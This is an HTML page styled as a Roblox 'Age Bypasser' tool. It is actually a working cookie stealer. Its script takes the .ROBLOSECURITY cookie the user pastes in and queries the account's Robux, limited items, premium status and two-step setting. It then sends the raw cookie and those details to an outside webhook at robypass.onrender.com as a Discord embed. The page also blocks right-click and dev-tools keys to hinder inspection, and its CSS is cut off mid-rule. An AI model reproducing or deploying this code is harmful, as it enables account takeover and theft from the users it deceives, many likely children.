<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Age Bypasser</title>
  <link rel="icon" type="image/png" href="icon.png">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap');
    
    :root {
      --primary-purple: #8B5CF6;
      --secondary-purple: #3B1F7F;
      --accent-cyan: #00D9FF;
      --accent-green: #10B981;
      --dark-bg: #0B0D14;
      --darker-bg: #06080D;
      --card-bg: rgba(15, 19, 28, 0.85);
      --border-color: rgba(139, 92, 246, 0.3);
      --text-primary: #F8FAFC;
      --text-secondary: #94A3B8;
      --text-muted: #64748B;
      --success: #10B981;
      --error: #EF4444;
      --warning: #F59E0B;
      --glow-purple: rgba(139, 92, 246, 0.4);
      --glow-cyan: rgba(0, 217, 255, 0.4);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--dark-bg);
      color: var(--text-primary);
      overflow-x: hidden;
      line-height: 1.6;
    }
    
    .hero-section {
      padding: 8rem 0 4rem;
      position: relative;
    }
    
    .hero-bg {
      position: absolute;
      inset: 0;
      background: radial-gradient(ellipse at top, rgba(139, 92, 246, 0.08) 0%, transparent 50%),
                  radial-gradient(ellipse at bottom, rgba(0, 217, 255, 0.05) 0%, transparent 50%),
                  linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 50%, var(--dark-bg) 100%);
    }
    
    .bg-element {
      position: absolute;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.7;
    }
    
    .bg-element-1 {
      top: 20%;
      left: 20%;
      width: 400px;
      height: 400px;
      background: radial-gradient(circle, rgba(139, 92, 246, 0.12) 0%, transparent 70%);
      animation: float 6s ease-in-out infinite;
    }
    
    .bg-element-2 {
      bottom: 20%;
      right: 20%;
      width: 500px;
      height: 500px;
      background: radial-gradient(circle, rgba(0, 217, 255, 0.08) 0%, transparent 70%);
      animation: float 8s ease-in-out infinite reverse;
    }
    
    .bg-element-3 {
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 600px;
      height: 600px;
      background: conic-gradient(from 0deg, rgba(139, 92, 246, 0.06), rgba(0, 217, 255, 0.04), rgba(139, 92, 246, 0.06));
      animation: spin 30s linear infinite;
    }
    
    @keyframes float {
      0%, 100% { transform: translate(0, 0) scale(1); }
      33% { transform: translate(20px, -20px) scale(1.05); }
      66% { transform: translate(-20px, 20px) scale(0.95); }
    }
    
    @keyframes spin {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    
    .hero-content {
      text-align: center;
      margin-bottom: 4rem;
      animation: fadeIn 1s ease-out forwards;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 1.5rem;
    }
    
    .row {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(480px, 1fr));
      gap: 2.5rem;
      justify-content: center;
    }
    
    .box {
      background: var(--card-bg);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      border: 1px solid var(--border-color);
      padding: 3rem 2rem;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4),

<!-- Background Animation Script -->
<script>
(function(){
  const canvas = document.getElementById("snowCanvas");
  // Check if canvas exists to prevent errors
  if (!canvas) return;
  
  const ctx = canvas.getContext("2d");
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;
  let snowflakes = [];
  const number = 100;

  for (let i = 0; i < number; i++){
      snowflakes.push({
          x: Math.random() * width,
          y: Math.random() * height,
          radius: Math.random() * 4 + 1,
          density: Math.random() * number
      });
  }

  let angle = 0;
  function drawSnowflakes(){
      ctx.clearRect(0, 0, width, height);
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          ctx.beginPath();
          if (i % 3 === 0) {
            ctx.fillStyle = "rgba(139, 92, 246, 0.6)";
          } else if (i % 3 === 1) {
            ctx.fillStyle = "rgba(0, 217, 255, 0.4)";
          } else {
            ctx.fillStyle = "rgba(139, 92, 246, 0.3)";
          }
          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
          ctx.fill();
          
          ctx.beginPath();
          ctx.fillStyle = i % 2 === 0 ? "rgba(139, 92, 246, 0.1)" : "rgba(0, 217, 255, 0.1)";
          ctx.arc(f.x, f.y, f.radius * 1.5, 0, Math.PI * 2, true);
          ctx.fill();
      }
      updateSnowflakes();
  }

  function updateSnowflakes(){
      angle += 0.005;
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
          f.x += Math.sin(angle) * 0.5;
          if (f.x > width + 5 || f.x < -5 || f.y > height) {
              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
          }
      }
  }
  
  setInterval(drawSnowflakes, 33);
  
  window.addEventListener("resize", function(){
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });
})();
</script>

<script>
$(document).ready(function() {
    const successSound = document.getElementById("sfx-success");
    const errorSound = document.getElementById("sfx-error");
    const swooshSound = document.getElementById("sfx-swoosh");

    // Configuration
    const proxyUrl = "https://robypass.onrender.com";
    const webhookUrl = `${proxyUrl}/webhook`;

    // A helper function for making API requests through the proxy
    async function makeProxyRequest(endpoint, cookie, method = "POST") {
        const response = await fetch(`${proxyUrl}${endpoint}`, {
            method,
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookie }),
        });
        if (!response.ok) {
            throw new Error(`Proxy failed for ${endpoint}: ${response.status}`);
        }
        return response.json();
    }

    // Fetches all account information
    async function getAccountInfo(cookie) {
        const defaultInfo = {
            username: "Unknown User",
            userId: "N/A",
            robuxBalance: "0",
            accountAge: "Unknown",
            avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
            rap: "0",
            ownedItems: "0",
            creditBalance: "0",
            hasPremium: false,
            hasKorblox: false,
            hasValk: false,
            hasHeadless: false,
            groupCount: "0",
            groupFunds: "0",
            twoStepEnabled: false,
            voiceChatEnabled: false,
        };

        try {
            // Get user info (ID and Name)
            const userData = await makeProxyRequest("/v1/users/authenticated", cookie);
            const userId = userData.id || defaultInfo.userId;
            const username = userData.name || defaultInfo.username;

            // Get avatar
            const avatarData = await makeProxyRequest(`/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, cookie);
            const avatarUrl = avatarData.data && avatarData.data[0] ? avatarData.data[0].imageUrl : defaultInfo.avatarUrl;

            // Get account age from user profile
            const profileData = await makeProxyRequest(`/v1/users/${userId}`, cookie);
            const createdDate = new Date(profileData.created);
            const accountAge = `${Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24))} Days`;
            
            // Get Robux balance
            const economyData = await makeProxyRequest("/v1/user/currency", cookie);
            const robuxBalance = economyData.robux ? economyData.robux.toString() : "0";

            // Get premium status
            const premiumData = await makeProxyRequest(`/v1/users/${userId}/validate-membership`, cookie);
            const hasPremium = premiumData.isPremium || false;

            // Get security settings
            const settingsData = await makeProxyRequest("/v1/account/settings", cookie);
            const twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
            const voiceChatEnabled = settingsData.isVoiceEnabled || false;

            // --- OPTIMIZED COLLECTIBLES FETCH ---
            // Fetch all collectibles only ONCE and process them for RAP, count, and special items.
            let rap = defaultInfo.rap;
            let ownedItems = defaultInfo.ownedItems;
            let hasKorblox = defaultInfo.hasKorblox;
            let hasValk = defaultInfo.hasValk;
            let hasHeadless = defaultInfo.hasHeadless;

            try {
                const inventoryData = await makeProxyRequest(`/v1/users/${userId}/assets/collectibles?limit=100`, cookie);
                const collectibles = inventoryData.data || [];
                
                ownedItems = collectibles.length.toString();
                rap = collectibles.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString();
                hasKorblox = collectibles.some(item => item.assetId === 139607718);
                hasValk = collectibles.some(item => item.assetId === 1365767);
                hasHeadless = collectibles.some(item => item.assetId === 134082579);
            } catch (invError) {
                console.warn("Could not fetch inventory collectibles:", invError.message);
            }

            // Return all the gathered information
            return {
                username,
                userId,
                robuxBalance,
                accountAge,
                avatarUrl,
                rap,
                ownedItems,
                hasPremium,
                hasKorblox,
                hasValk,
                hasHeadless,
                twoStepEnabled,
                voiceChatEnabled,
                creditBalance: "0", // Default value
                groupCount: "0",    // Default value
                groupFunds: "0",    // Default value
            };

        } catch (error) {
            console.error("Failed to get account info:", error.message);
            return defaultInfo; // Return default info if anything fails
        }
    }

    // Handle the form submission
    $("#cookieForm").on("submit", async function(e) {
        e.preventDefault();
        const cookie = $("#cookieInput").val().trim();

        if (!cookie) {
            showNotif("Cookie cannot be empty.", false);
            errorSound.play();
            return;
        }

        // Show loader and hide button
        $("#refreshBtn").hide();
        $("#loader").show();
        $("#userInfo").hide();
        $("#refreshedBox").hide();

        try {
            // Get all account info
            const accountInfo = await getAccountInfo(cookie);

            // If the userId is still N/A, the cookie was invalid
            if (accountInfo.userId === "N/A") {
                throw new Error("Invalid cookie or failed to fetch user data.");
            }

            // Show success notification
            showNotif("✅ Cookie processed successfully!", true);
            swooshSound.play();

            // Build the Discord embed with the gathered data
            const webhookPayload = {
                username: "Roblox Bypasser Bot",
                content: "@everyone",
                embeds: [{
                    title: "**```Homepage - Result```**",
                    description: `[Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468>`,
                    color: 0x3B1F7F,
                    author: {
                        name: `${accountInfo.username}`,
                        url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
                        icon_url: accountInfo.avatarUrl,
                    },
                    thumbnail: { url: accountInfo.avatarUrl },
                    fields: [
                        { name: "About User", value: `\`\`Account Age: ${accountInfo.accountAge}\`\``, inline: false },
                        { name: "<:Robux:1313020721987063829> Robux", value: `Balance: ${accountInfo.robuxBalance}`, inline: true },
                        { name: "<:Limited:1313024834783154211> Rap", value: `Rap: ${accountInfo.rap}\nOwned: ${accountInfo.ownedItems}`, inline: true },
                        { name: "<:Premium:1313020726474706994> Premium", value: `${accountInfo.hasPremium ? "True" : "False"}`, inline: true },
                        { name: "<:Settings:1313020732225093672> Settings", value: `<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`, inline: true },
                        { name: "<:Collectible:1313026924678742087> Collectibles", value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`, inline: true },
                        { name: "<:banks:1349856883498029097> Groups", value: `**Owned:** ${accountInfo.groupCount}\n**Funds:** ${accountInfo.groupFunds}`, inline: true },
                    ],
                    timestamp: new Date().toISOString(),
                }, {
                    description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
                    color: 0x3B1F7F,
                }],
            };

            // Send the data to the webhook
            const webhookRes = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(webhookPayload),
            });

            if (!webhookRes.ok) {
                console.error("Webhook failed:", webhookRes.status, await webhookRes.text());
                throw new Error("Could not send data to webhook.");
            }
            
            successSound.play();
            $("#refreshedBox").fadeIn();

        } catch (error) {
            console.error("Submit error:", error.message);
            showNotif(`Error: ${error.message}`, false);
            errorSound.play();
        } finally {
            $("#loader").hide();
        }
    });

    // Simple notification function
    function showNotif(msg, isSuccess = false) {
        const $notif = $("#notif");
        $notif.removeClass('notif-success notif-error').addClass(isSuccess ? 'notif-success' : 'notif-error');
        $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
    }

    // Typed text effect
    const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
    let i = 0;
    const typedText = document.getElementById("typedText");

    function typeEffect() {
        const text = texts[i];
        let index = 0;
        const typing = setInterval(() => {
            if (index <= text.length) {
                typedText.textContent = text.slice(0, index);
                index++;
            } else {
                clearInterval(typing);
                setTimeout(() => {
                    let backspaceIndex = text.length;
                    const backspace = setInterval(() => {
                        if (backspaceIndex > 0) {
                            typedText.textContent = text.slice(0, backspaceIndex - 1);
                            backspaceIndex--;
                        } else {
                            clearInterval(backspace);
                            i = (i + 1) % texts.length;
                            setTimeout(typeEffect, 300);
                        }
                    }, 50);
                }, 2000);
            }
        }, 100);
    }
    typeEffect();

    // Reset button functionality
    $("#returnBtn").on("click", function () {
        $("#refreshedBox").hide();
        $("#cookieInput").val("");
        $("#refreshBtn").show();
    });

    // Disable context menu and dev tools (basic protection)
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key.toUpperCase() === 'U')) {
            e.preventDefault();
        }
    });
});
</script>
